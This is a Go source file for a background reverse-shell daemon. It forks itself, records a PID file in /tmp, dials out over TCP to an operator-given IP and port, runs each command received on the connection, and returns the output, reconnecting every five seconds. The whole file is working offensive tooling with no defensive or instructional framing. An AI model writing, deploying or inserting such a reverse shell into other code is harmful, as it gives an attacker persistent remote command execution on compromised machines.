package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var PIDFile = "/tmp/daemonize.pid"

func savePID(pid int) {

	file, err := os.Create(PIDFile)
	if err != nil {
		log.Printf("Unable to create pid file : %v\n", err)
		os.Exit(1)
	}

	defer file.Close()

	_, err = file.WriteString(strconv.Itoa(pid))

	if err != nil {
		log.Printf("Unable to create pid file : %v\n", err)
		os.Exit(1)
	}

	file.Sync() // flush to disk

}

func shell(ip string, port string) {
	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		fmt.Printf("%s\n", err)
		return
	}

	for {

		message, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Printf("%s\n", err)
			return
		}
		args := strings.Fields(strings.TrimSuffix(message, "\n"))
		out, err := exec.Command(args[0], args[1:]...).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n", out)

	}
}

func main() {
	if len(os.Args) != 4 {
		fmt.Printf("Usage : %s [start|stop] <IP> <Port>\n ", os.Args[0]) // return the program name back to %s
		os.Exit(0)                                                       // graceful exit
	}
	fmt.Println("Args: " + os.Args[1] + " " + os.Args[2] + " " + os.Args[3])
	if strings.ToLower(os.Args[1]) == "main" {

		// Make arrangement to remove PID file upon receiving the SIGTERM from kill command
		ch := make(chan os.Signal, 1)
		signal.Notify(ch, os.Interrupt, os.Kill, syscall.SIGTERM)

		go func() {
			signalType := <-ch
			signal.Stop(ch)
			fmt.Println("Exit command received. Exiting...")

			// this is a good place to flush everything to disk
			// before terminating.
			fmt.Println("Received signal type : ", signalType)

			// remove PID file
			os.Remove(PIDFile)

			os.Exit(0)

		}()

		for {
			shell(os.Args[2], os.Args[3])
			seconds := 5
			time.Sleep(time.Second * time.Duration(seconds))
		}
	}

	if strings.ToLower(os.Args[1]) == "start" {

		// check if daemon already running.
		if _, err := os.Stat(PIDFile); err == nil {
			fmt.Println("Already running or /tmp/daemonize.pid file exist.")
			os.Exit(1)
		}

		cmd := exec.Command(os.Args[0], "main", os.Args[2], os.Args[3])
		cmd.Start()
		fmt.Println("Daemon process ID is : ", cmd.Process.Pid)
		savePID(cmd.Process.Pid)
		os.Exit(0)

	}

	// upon receiving the stop command
	// read the Process ID stored in PIDfile
	// kill the process using the Process ID
	// and exit. If Process ID does not exist, prompt error and quit

	if strings.ToLower(os.Args[1]) == "stop" {
		if _, err := os.Stat(PIDFile); err == nil {
			data, err := ioutil.ReadFile(PIDFile)
			if err != nil {
				fmt.Println("Not running")
				os.Exit(1)
			}
			ProcessID, err := strconv.Atoi(string(data))

			if err != nil {
				fmt.Println("Unable to read and parse process id found in ", PIDFile)
				os.Exit(1)
			}

			process, err := os.FindProcess(ProcessID)

			if err != nil {
				fmt.Printf("Unable to find process ID [%v] with error %v \n", ProcessID, err)
				os.Exit(1)
			}
			// remove PID file
			os.Remove(PIDFile)

			fmt.Printf("Killing process ID [%v] now.\n", ProcessID)
			// kill process and exit immediately
			err = process.Kill()

			if err != nil {
				fmt.Printf("Unable to kill process ID [%v] with error %v \n", ProcessID, err)
				os.Exit(1)
			} else {
				fmt.Printf("Killed process ID [%v]\n", ProcessID)
				os.Exit(0)
			}

		} else {

			fmt.Println("Not running.")
			os.Exit(1)
		}
	} else {
		fmt.Printf("Unknown command : %v\n", os.Args[1])
		fmt.Printf("Usage : %s [start|stop] <IP> <PORT> \n", os.Args[0]) // return the program name back to %s
		os.Exit(1)
	}

}
